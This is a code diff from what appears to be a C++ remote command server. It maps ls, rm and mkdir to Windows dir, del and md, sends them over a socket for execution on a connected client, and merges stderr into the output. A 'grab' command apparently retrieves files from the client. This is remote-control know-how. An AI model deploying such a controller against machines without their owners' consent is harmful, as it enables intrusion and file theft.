@@ -68,26 +68,20 @@ private:
         else if(cmd.starts_with("pwd")){
             this->genericCmd("pwd;");
         }
-        else if(cmd.starts_with("ls -a")){ // Important to check this before checking for just "ls"
+        else if(cmd.starts_with("ls -a") || cmd.starts_with("dir /a")){ // Important to check for ls -a before ls because ls -a starts with ls
             this->exec("dir /a");
         }
-        else if(cmd.starts_with("ls")){
-            this->exec("dir");
-        }
-        else if(cmd.starts_with("dir /a")){
-            this->exec("dir /a");
-        }
-        else if(cmd.starts_with("dir")){
+        else if(cmd.starts_with("ls") || cmd.starts_with("dir")){
             this->exec("dir");
         }
         else if(cmd.starts_with("cd ")){
             this->genericCmd("cd;" + cmd.substr(3) + ";");
         }
-        else if(cmd.starts_with("rm ")){
-            this->genericCmd("rm;" + cmd.substr(3) + ";");
+        else if(cmd.starts_with("rm ") || cmd.starts_with("del ")){
+            this->exec("del " + cmd.substr(cmd[0]=='r' ? 3 : 4));
         }
-        else if(cmd.starts_with("mkdir ")){
-            this->genericCmd("mkdir;" + cmd.substr(6) + ";");
+        else if(cmd.starts_with("mkdir ") || cmd.starts_with("md ")){
+            this->exec("md " + cmd.substr(cmd[1]=='k' ? 6 : 3));
         }
         else if(cmd.starts_with("grab ")){
             this->grab(cmd.substr(5));
@@ -276,6 +270,7 @@ private:
             exec;<command>;<response length>;<response data>;
     */
     void exec(std::string cmd){
+        cmd += " 2>&1"; // Redirects stderr to stdout
         this->sockFdMutex.lock();
 
         // Send the command to the client
